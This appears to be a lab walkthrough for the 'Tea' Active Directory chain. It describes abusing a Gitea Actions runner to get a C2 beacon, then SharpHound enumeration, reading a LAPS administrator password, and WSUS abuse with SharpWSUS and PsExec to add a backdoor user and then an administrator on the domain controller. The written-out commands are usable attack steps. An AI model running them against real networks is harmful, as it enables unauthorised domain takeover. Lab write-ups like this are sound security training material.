# Tea (chain) (medium)

## port scan

10.10.178.198 srv.tea.vl
10.10.178.197 dc.tea.vl

![](<tea(chain)(medium)/walkthrough_20240413120505926.png>)

## service enumeration

![](<tea(chain)(medium)/walkthrough_20240413113404118.png>)

![](<tea(chain)(medium)/walkthrough_20240413113522341.png>)

![](<tea(chain)(medium)/walkthrough_20240413113553212.png>)

register a account, we can found a runner `SRV`

![](<tea(chain)(medium)/walkthrough_20240413113712898.png>)

## gitea runner abuse

so there have a runner, we will create a action let runner execute our evil code

![](<tea(chain)(medium)/walkthrough_20240413114809492.png>)

i will create a new repo with `.gitea/workflows/demo.yaml`

![](<tea(chain)(medium)/walkthrough_20240413114735058.png>)

add our evil job

![](<tea(chain)(medium)/walkthrough_20240413115436208.png>)

push!

![](<tea(chain)(medium)/walkthrough_20240413115806546.png>)

after push, we must enable actions at our repo

![](<tea(chain)(medium)/walkthrough_20240413115922959.png>)

just commit again with every change

![](<tea(chain)(medium)/walkthrough_20240413120135855.png>)

it works now

![](<tea(chain)(medium)/walkthrough_20240413120050458.png>)

we have a beacon!

![](<tea(chain)(medium)/walkthrough_20240413120108857.png>)

![](<tea(chain)(medium)/walkthrough_20240413120429876.png>)

## some enumeration

![](<tea(chain)(medium)/walkthrough_20240413123104618.png>)

![](<tea(chain)(medium)/walkthrough_20240413123224254.png>)

![](<tea(chain)(medium)/walkthrough_20240413123411154.png>)

![](<tea(chain)(medium)/walkthrough_20240413123426608.png>)

```bash
dotnet inline-execute /home/sh4n4c1/.sliver-client/aliases/sharp-hound-4/SharpHound.exe --zippassword backup123 --outputdirectory C:\windows\tasks
```

![](<tea(chain)(medium)/walkthrough_20240413125228716.png>)

![](<tea(chain)(medium)/walkthrough_20240413125603400.png>)

![](<tea(chain)(medium)/walkthrough_20240413125828982.png>)

![](<tea(chain)(medium)/walkthrough_20240413125953931.png>)

![](<tea(chain)(medium)/walkthrough_20240413130950135.png>)

![](<tea(chain)(medium)/walkthrough_20240413131822802.png>)

## read LAPS

in \_instal folder, there have a laps installer

![](<tea(chain)(medium)/walkthrough_20240413132909413.png>)

we can use `Get-LapsADPassword -Identity SRV -AsPlainText` read administrator password

![](<tea(chain)(medium)/walkthrough_20240413134516003.png>)

work

![](<tea(chain)(medium)/walkthrough_20240413134533715.png>)

## WSUS abuse

ther have a folder called `WSUS-Updates`

![](<tea(chain)(medium)/walkthrough_20240413134622113.png>)

get a administrator beacon and run sharpwsus inspect

![](<tea(chain)(medium)/walkthrough_20240413141221853.png>)

it show srv is wsus server, we can use

https://github.com/techspence/SharpWSUS to abuse wsus

we will push psexec (just allow ms sign), and add a user

```bash
C:\_install\SharpWSUS.exe create /payload:"c:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net user shanacl Password123! /add\""
```

![](<tea(chain)(medium)/walkthrough_20240413153120191.png>)

then approve the request

```bash
C:\_install\SharpWSUS.exe approve /updateid:57d84ee8-c48d-41da-839b-200002f56996 /computername:dc.tea.vl /groupname:"pepepe"
```

![](<tea(chain)(medium)/walkthrough_20240413153212894.png>)

it works

![](<tea(chain)(medium)/walkthrough_20240413162055156.png>)

and the user at there

![](<tea(chain)(medium)/walkthrough_20240413162037905.png>)

now try again to add our evil user into administrators group

![](<tea(chain)(medium)/walkthrough_20240413162242774.png>)

![](<tea(chain)(medium)/walkthrough_20240413162342199.png>)

administrator shell!

![](<tea(chain)(medium)/walkthrough_20240413162820642.png>)
